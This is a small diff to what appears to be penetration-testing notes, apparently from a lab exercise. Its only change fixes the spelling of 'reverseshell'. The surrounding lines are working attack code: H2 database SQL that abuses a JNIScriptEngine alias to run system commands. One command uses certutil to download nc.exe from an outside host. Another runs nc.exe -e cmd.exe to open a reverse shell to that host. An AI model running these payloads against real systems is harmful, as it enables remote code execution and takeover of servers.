@@ -53,7 +53,7 @@ upload nc.exe
 CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.180:80/nc.exe C:/Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');
 ```
-get the reversesehll
+get the reverseshell
 ```console
 CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/nc.exe -e cmd.exe 192.168.45.180 8082").getInputStream()).useDelimiter("\\Z").next()');
